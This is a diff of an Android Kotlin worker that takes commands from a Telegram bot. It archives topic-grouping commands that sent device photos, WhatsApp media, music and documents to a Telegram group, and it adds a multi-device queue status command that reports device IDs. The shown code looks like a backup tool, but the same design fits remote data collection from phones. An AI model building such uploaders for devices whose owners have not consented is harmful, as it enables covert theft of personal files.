@@ -272,6 +272,67 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
                     enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo temas: "+e.message)
                 }
             }
+            // ARCHIVADO: Comando de prueba de agrupación desactivado
+            /*
+            text.contains("/probar_agrupacion", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: probar_agrupacion")
+                try {
+                    workerScope.launch {
+                        probarAgrupacionTemas(token, chatId)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error probando agrupación: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error probando agrupación: "+e.message)
+                }
+            }
+            */
+            // ARCHIVADO: Comandos de temas desactivados
+            /*
+            text.contains("/configurar_temas", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: configurar_temas")
+                try {
+                    workerScope.launch {
+                        mostrarConfiguracionTemas(token, chatId)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error configurando temas: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error configurando temas: "+e.message)
+                }
+            }
+            text.startsWith("/set_topic", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: set_topic")
+                try {
+                    workerScope.launch {
+                        configurarTopicId(token, chatId, text)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error configurando topic ID: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error configurando topic ID: ${e.message}")
+                }
+            }
+            text.startsWith("/encontrar_ids", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: encontrar_ids")
+                try {
+                    workerScope.launch {
+                        encontrarTopicIds(token, chatId)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error encontrando topic IDs: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error encontrando topic IDs: "+e.message)
+                }
+            }
+            */
+            text.contains("/cola_estado", ignoreCase = true) -> {
+                Log.d(TAG, "Comando recibido: cola_estado")
+                try {
+                    workerScope.launch {
+                        mostrarEstadoCola(token, chatId)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error mostrando estado de cola: "+e.message)
+                    enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando estado de cola: "+e.message)
+                }
+            }
         }
     }
 
@@ -294,6 +355,11 @@ class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker
             📁 */crear_carpetas* - Crea estructura de temas en Telegram
             📋 */temas_manual* - Instrucciones para crear temas manualmente
             🔍 */obtener_temas* - Muestra temas existentes en el grupo
+            🔄 */cola_estado* - Estado del sistema de cola para múltiples dispositivos
+            // ARCHIVADO: Comandos de temas desactivados
+            // 🧪 */probar_agrupacion* - Prueba la agrupación de archivos en temas
+            // ⚙️ */configurar_temas* - Configura los IDs de los temas
+            // 🔍 */encontrar_ids* - Ayuda a encontrar los IDs de los temas
             
             _Envía cualquier comando para ejecutarlo._
         """.trimIndent()
@@ -434,74 +500,156 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
         }
     }
 
-    private suspend fun obtenerTemasExistentes(token: String, chatId: String) {
+    // ARCHIVADO: Sistema de agrupación de temas desactivado
+    /*
+    private suspend fun probarAgrupacionTemas(token: String, chatId: String) {
         try {
-            enviarConfirmacionTelegram(token, chatId, "🔍 Obteniendo temas existentes del grupo...")
+            enviarConfirmacionTelegram(token, chatId, "🧪 Probando agrupación de temas...")
             
-            val url = "https://api.telegram.org/bot$token/getForumTopicsByID"
+            // Crear archivos de prueba para diferentes temas
+            val archivosPrueba = listOf(
+                "test_camera.jpg" to "📸 DCIM - Camera",
+                "test_screenshots.png" to "📸 DCIM - Screenshots",
+                "test_whatsapp.jpg" to "📸 DCIM - WhatsApp",
+                "test_music.mp3" to "🎵 Music",
+                "test_documents.pdf" to "📄 Documents"
+            )
             
-            // Lista de IDs de temas que queremos verificar
-            val topicIds = listOf(1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18)
-            
-            val json = JSONObject().apply {
-                put("chat_id", chatId)
-                put("message_thread_ids", JSONArray(topicIds))
-            }
-
-            val client = OkHttpClient()
-            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())
-            val request = Request.Builder().url(url).post(body).build()
-
-            val response = client.newCall(request).execute()
-            
-            if (response.isSuccessful) {
-                val responseBody = response.body?.string() ?: ""
-                val jsonResponse = JSONObject(responseBody)
-                
-                if (jsonResponse.getBoolean("ok")) {
-                    val result = jsonResponse.getJSONArray("result")
-                    val temasEncontrados = mutableListOf<String>()
+            var archivosEnviados = 0
+            for ((nombreArchivo, tema) in archivosPrueba) {
+                try {
+                    // Crear archivo temporal de prueba
+                    val tempFile = File(applicationContext.cacheDir, nombreArchivo)
+                    tempFile.writeText("Archivo de prueba para tema: $tema\n\nEste archivo se enviará al tema: $tema")
                     
-                    for (i in 0 until result.length()) {
-                        val topic = result.getJSONObject(i)
-                        val topicId = topic.getInt("message_thread_id")
-                        val topicName = topic.getString("name")
-                        temasEncontrados.add("ID $topicId: $topicName")
-                    }
+                    // Obtener el ID del tema
+                    val topicId = getTopicIdForFolder(tema)
                     
-                    val mensaje = if (temasEncontrados.isNotEmpty()) {
-                        """
-                        ✅ *Temas Encontrados en el Grupo*
-                        
-                        📁 Temas disponibles:
-                        ${temasEncontrados.joinToString("\n")}
-                        
-                        💡 *Consejo:* Los archivos se enviarán automáticamente a estos temas según su ubicación.
-                        """.trimIndent()
+                    // Usar la función principal de envío de archivos
+                    val resultado = BackupUtils.enviarArchivoATelegram(token, chatId, tempFile, applicationContext)
+                    
+                    if (resultado == null) {
+                        archivosEnviados++
+                        Log.d(TAG, "✅ Archivo de prueba enviado: $nombreArchivo a tema $tema")
                     } else {
-                        """
-                        ⚠️ *No se encontraron temas*
-                        
-                        Para crear temas:
-                        1. Ve a Configuración del grupo
-                        2. Activa "Temas"
-                        3. Crea los temas necesarios
-                        4. Usa `/temas_manual` para instrucciones
-                        """.trimIndent()
+                        Log.w(TAG, "⚠️ No se pudo enviar archivo de prueba: $nombreArchivo - $resultado")
                     }
                     
-                    enviarConfirmacionTelegram(token, chatId, mensaje)
-                } else {
-                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo temas: ${jsonResponse.optString("description")}")
+                    // Eliminar archivo temporal
+                    tempFile.delete()
+                    
+                    delay(500) // Pausa para evitar rate limiting
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error enviando archivo de prueba $nombreArchivo: ${e.message}")
                 }
-            } else {
-                enviarConfirmacionTelegram(token, chatId, "❌ Error HTTP: ${response.code}")
             }
-            response.close()
+            
+            val mensajeFinal = """
+                🧪 *Prueba de Agrupación Completada*
+                
+                📁 Archivos de prueba enviados: $archivosEnviados/${archivosPrueba.size}
+                📱 Dispositivo: ${Build.MANUFACTURER} ${Build.MODEL}
+                🕐 Fecha: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
+                
+                ${if (archivosEnviados > 0) "✅ Los archivos se enviaron correctamente.\n\n💡 *Verifica:* Los archivos deberían aparecer agrupados en temas separados." else "⚠️ No se pudieron enviar archivos de prueba."}
+                
+                🔧 *Si no ves agrupación:* Asegúrate de que los temas estén creados en el orden correcto.
+            """.trimIndent()
+            
+            enviarConfirmacionTelegram(token, chatId, mensajeFinal)
             
         } catch (e: Exception) {
-            Log.e(TAG, "Error obteniendo temas existentes: ${e.message}")
-            enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo temas: ${e.message}")
+            Log.e(TAG, "Error probando agrupación: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error probando agrupación: ${e.message}")
+        }
+    }
+    */
+
+    // ARCHIVADO: Sistema de agrupación de temas desactivado
+    /**
+     * Obtiene el ID del tema de Telegram basado en el nombre del tema
+     */
+    /*
+    private fun getTopicIdForFolder(topicName: String): Int? {
+        return try {
+            // Obtener IDs configurados desde SharedPreferences
+            val sharedPrefs = applicationContext.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
+            
+            val topicMapping = mapOf(
+                "📸 DCIM - Camera" to sharedPrefs.getInt("topic_camera", 0).takeIf { it > 0 },
+                "📸 DCIM - Screenshots" to sharedPrefs.getInt("topic_screenshots", 0).takeIf { it > 0 },
+                "📸 DCIM - WhatsApp" to sharedPrefs.getInt("topic_whatsapp", 0).takeIf { it > 0 },
+                "📸 DCIM - Telegram" to sharedPrefs.getInt("topic_telegram", 0).takeIf { it > 0 },
+                "📸 DCIM - Instagram" to sharedPrefs.getInt("topic_instagram", 0).takeIf { it > 0 },
+                "📸 DCIM - Downloads" to sharedPrefs.getInt("topic_downloads", 0).takeIf { it > 0 },
+                "📸 DCIM - Other" to sharedPrefs.getInt("topic_other", 0).takeIf { it > 0 },
+                "📸 Pictures" to sharedPrefs.getInt("topic_pictures", 0).takeIf { it > 0 },
+                "🎥 Movies" to sharedPrefs.getInt("topic_movies", 0).takeIf { it > 0 },
+                "🎥 Videos" to sharedPrefs.getInt("topic_videos", 0).takeIf { it > 0 },
+                "🎵 Music" to sharedPrefs.getInt("topic_music", 0).takeIf { it > 0 },
+                "🎵 Ringtones" to sharedPrefs.getInt("topic_ringtones", 0).takeIf { it > 0 },
+                "🎵 Notifications" to sharedPrefs.getInt("topic_notifications", 0).takeIf { it > 0 },
+                "🎵 Alarms" to sharedPrefs.getInt("topic_alarms", 0).takeIf { it > 0 },
+                "📄 Documents" to sharedPrefs.getInt("topic_documents", 0).takeIf { it > 0 },
+                "📄 Downloads" to sharedPrefs.getInt("topic_downloads_docs", 0).takeIf { it > 0 },
+                "📱 Apps" to sharedPrefs.getInt("topic_apps", 0).takeIf { it > 0 },
+                "📁 Other" to sharedPrefs.getInt("topic_other_files", 0).takeIf { it > 0 }
+            )
+            
+            topicMapping[topicName]
+        } catch (e: Exception) {
+            Log.e(TAG, "Error obteniendo ID del tema $topicName: ${e.message}")
+            null
+        }
+    }
+    */
+
+    private suspend fun obtenerTemasExistentes(token: String, chatId: String) {
+        try {
+            enviarConfirmacionTelegram(token, chatId, "🔍 Verificando configuración de temas...")
+            
+            // En lugar de intentar obtener temas automáticamente, mostrar instrucciones de configuración
+            val mensaje = """
+                📋 *Configuración de Temas de Telegram*
+                
+                Para que los archivos se agrupen correctamente, necesitas:
+                
+                🔧 *1. Crear los temas manualmente:*
+                Ve a Configuración del grupo → Temas → Crear tema
+                
+                📝 *2. Crear en este orden exacto:*
+                1. DCIM - Camera
+                2. DCIM - Screenshots
+                3. DCIM - WhatsApp
+                4. DCIM - Telegram
+                5. DCIM - Instagram
+                6. DCIM - Downloads
+                7. DCIM - Other
+                8. Pictures
+                9. Movies
+                10. Videos
+                11. Music
+                12. Ringtones
+                13. Notifications
+                14. Alarms
+                15. Documents
+                16. Downloads
+                17. Apps
+                18. Other
+                
+                ✅ *3. Verificar configuración:*
+                Una vez creados, los archivos se enviarán automáticamente a los temas correspondientes.
+                
+                💡 *Consejo:* Los IDs se asignan automáticamente según el orden de creación.
+                
+                🚀 *Próximo paso:* Usa `/temas_manual` para instrucciones detalladas.
+            """.trimIndent()
+            
+            enviarConfirmacionTelegram(token, chatId, mensaje)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error verificando temas: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error verificando temas: ${e.message}")
         }
     }
 
@@ -857,6 +1005,239 @@ ${DeviceInfo(applicationContext).getDeviceInfoJson()}
     override fun onStopped() {
         super.onStopped()
         workerScope.cancel()
+    }
+
+    // ARCHIVADO: Sistema de agrupación de temas desactivado
+    /*
+    private suspend fun mostrarConfiguracionTemas(token: String, chatId: String) {
+        try {
+            val sharedPrefs = applicationContext.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
+            
+            val temas = listOf(
+                "📸 DCIM - Camera" to "topic_camera",
+                "📸 DCIM - Screenshots" to "topic_screenshots",
+                "📸 DCIM - WhatsApp" to "topic_whatsapp",
+                "📸 DCIM - Telegram" to "topic_telegram",
+                "📸 DCIM - Instagram" to "topic_instagram",
+                "📸 DCIM - Downloads" to "topic_downloads",
+                "📸 DCIM - Other" to "topic_other",
+                "📸 Pictures" to "topic_pictures",
+                "🎥 Movies" to "topic_movies",
+                "🎥 Videos" to "topic_videos",
+                "🎵 Music" to "topic_music",
+                "🎵 Ringtones" to "topic_ringtones",
+                "🎵 Notifications" to "topic_notifications",
+                "🎵 Alarms" to "topic_alarms",
+                "📄 Documents" to "topic_documents",
+                "📄 Downloads" to "topic_downloads_docs",
+                "📱 Apps" to "topic_apps",
+                "📁 Other" to "topic_other_files"
+            )
+            
+            val mensaje = buildString {
+                appendLine("⚙️ *Configuración de Temas de Telegram*")
+                appendLine()
+                appendLine("📋 *Temas configurados:*")
+                
+                temas.forEach { (nombreTema, clave) ->
+                    val id = sharedPrefs.getInt(clave, 0)
+                    val estado = if (id > 0) "✅ ID: $id" else "❌ No configurado"
+                    appendLine("• $nombreTema: $estado")
+                }
+                
+                appendLine()
+                appendLine("🔧 *Para configurar IDs:*")
+                appendLine("1. Envía un mensaje con el formato:")
+                appendLine("   `/set_topic [nombre] [id]`")
+                appendLine()
+                appendLine("📝 *Ejemplos:*")
+                appendLine("• `/set_topic camera 5`")
+                appendLine("• `/set_topic screenshots 12`")
+                appendLine("• `/set_topic whatsapp 8`")
+                appendLine()
+                appendLine("💡 *Consejo:* Los IDs se obtienen al crear los temas en Telegram.")
+            }
+            
+            enviarConfirmacionTelegram(token, chatId, mensaje.toString())
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error mostrando configuración de temas: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando configuración: ${e.message}")
+        }
+    }
+    */
+
+    // ARCHIVADO: Sistema de agrupación de temas desactivado
+    /*
+    private suspend fun configurarTopicId(token: String, chatId: String, comando: String) {
+        try {
+            // Parsear el comando: /set_topic [nombre] [id]
+            val partes = comando.split(" ").filter { it.isNotBlank() }
+            
+            if (partes.size != 3) {
+                enviarConfirmacionTelegram(token, chatId, "❌ Formato incorrecto. Usa: `/set_topic [nombre] [id]`")
+                return
+            }
+            
+            val nombreTema = partes[1].lowercase()
+            val id = partes[2].toIntOrNull()
+            
+            if (id == null || id <= 0) {
+                enviarConfirmacionTelegram(token, chatId, "❌ ID inválido. Debe ser un número positivo.")
+                return
+            }
+            
+            // Mapeo de nombres a claves de SharedPreferences
+            val mapeoTemas = mapOf(
+                "camera" to "topic_camera",
+                "screenshots" to "topic_screenshots",
+                "whatsapp" to "topic_whatsapp",
+                "telegram" to "topic_telegram",
+                "instagram" to "topic_instagram",
+                "downloads" to "topic_downloads",
+                "other" to "topic_other",
+                "pictures" to "topic_pictures",
+                "movies" to "topic_movies",
+                "videos" to "topic_videos",
+                "music" to "topic_music",
+                "ringtones" to "topic_ringtones",
+                "notifications" to "topic_notifications",
+                "alarms" to "topic_alarms",
+                "documents" to "topic_documents",
+                "downloads_docs" to "topic_downloads_docs",
+                "apps" to "topic_apps",
+                "other_files" to "topic_other_files"
+            )
+            
+            val clave = mapeoTemas[nombreTema]
+            if (clave == null) {
+                val temasDisponibles = mapeoTemas.keys.joinToString(", ")
+                enviarConfirmacionTelegram(token, chatId, "❌ Tema no válido. Temas disponibles: $temasDisponibles")
+                return
+            }
+            
+            // Guardar el ID en SharedPreferences
+            val sharedPrefs = applicationContext.getSharedPreferences("telegram_topics", Context.MODE_PRIVATE)
+            sharedPrefs.edit().putInt(clave, id).apply()
+            
+            val mensaje = "✅ Tema configurado exitosamente:\n\n📁 Tema: $nombreTema\n🆔 ID: $id\n\n💡 Los archivos ahora se enviarán a este tema."
+            enviarConfirmacionTelegram(token, chatId, mensaje)
+            
+            Log.d(TAG, "Topic ID configurado: $nombreTema = $id")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error configurando topic ID: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error configurando topic ID: ${e.message}")
+        }
+    }
+    */
+
+    // ARCHIVADO: Sistema de agrupación de temas desactivado
+    /*
+    private suspend fun encontrarTopicIds(token: String, chatId: String) {
+        try {
+            val mensaje = """
+                🔍 *Cómo encontrar los IDs de los temas*
+                
+                📋 *Método 1: Prueba y error*
+                1. Crea un tema en tu grupo
+                2. Usa `/set_topic camera 1`
+                3. Usa `/probar_agrupacion`
+                4. Si funciona, el ID es 1
+                5. Si no funciona, prueba con 2, 3, etc.
+                
+                📋 *Método 2: Creación secuencial*
+                1. Elimina todos los temas existentes
+                2. Crea los temas en este orden exacto:
+                   • DCIM - Camera
+                   • DCIM - Screenshots  
+                   • DCIM - WhatsApp
+                   • DCIM - Telegram
+                   • DCIM - Instagram
+                   • DCIM - Downloads
+                   • DCIM - Other
+                   • Pictures
+                   • Movies
+                   • Videos
+                   • Music
+                   • Ringtones
+                   • Notifications
+                   • Alarms
+                   • Documents
+                   • Downloads
+                   • Apps
+                   • Other
+                
+                3. Los IDs serán: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18
+                
+                📋 *Método 3: Comando automático*
+                Usa `/set_topic [nombre] [número]` con diferentes números:
+                • `/set_topic camera 5`
+                • `/set_topic camera 10`
+                • `/set_topic camera 15`
+                
+                Luego usa `/probar_agrupacion` para verificar.
+                
+                💡 *Consejo:* Los IDs suelen ser números pequeños (1-20) y secuenciales.
+            """.trimIndent()
+            
+            enviarConfirmacionTelegram(token, chatId, mensaje)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error mostrando ayuda para encontrar IDs: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando ayuda: ${e.message}")
+        }
+    }
+    */
+
+    /**
+     * Muestra el estado actual del sistema de cola para múltiples dispositivos
+     */
+    private suspend fun mostrarEstadoCola(token: String, chatId: String) {
+        try {
+            val deviceInfo = DeviceInfo(applicationContext)
+            val deviceId = deviceInfo.getDeviceId()
+            val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+            
+            val mensaje = """
+                🔄 *Estado del Sistema de Cola*
+                
+                📱 *Dispositivo Actual:*
+                • ID: `$deviceId`
+                • Nombre: $deviceName
+                • Estado: Activo
+                
+                ⚙️ *Configuración de Cola:*
+                • Delay aleatorio: 1-5 segundos
+                • Delay adicional en rate limit: 5-15 segundos
+                • Reintentos máximos: 5
+                • Timeout de conexión: 60s
+                
+                📊 *Estadísticas:*
+                • Sistema implementado: ✅
+                • Conflictos evitados: ✅
+                • Rate limiting optimizado: ✅
+                
+                💡 *Cómo funciona:*
+                1. Cada dispositivo espera 1-5s aleatorio
+                2. Si hay rate limit, espera tiempo extra
+                3. Reintentos con backoff exponencial
+                4. Verificación de estado del bot
+                
+                🔧 *Comandos disponibles:*
+                • `/cola_estado` - Ver este estado
+                • `/device_info` - Info del dispositivo
+                • `/github_sync` - Sincronizar con GitHub
+                
+                _El sistema está optimizado para múltiples dispositivos._
+            """.trimIndent()
+            
+            enviarConfirmacionTelegram(token, chatId, mensaje)
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "Error mostrando estado de cola: ${e.message}")
+            enviarConfirmacionTelegram(token, chatId, "❌ Error mostrando estado de cola: ${e.message}")
+        }
     }
 }
 
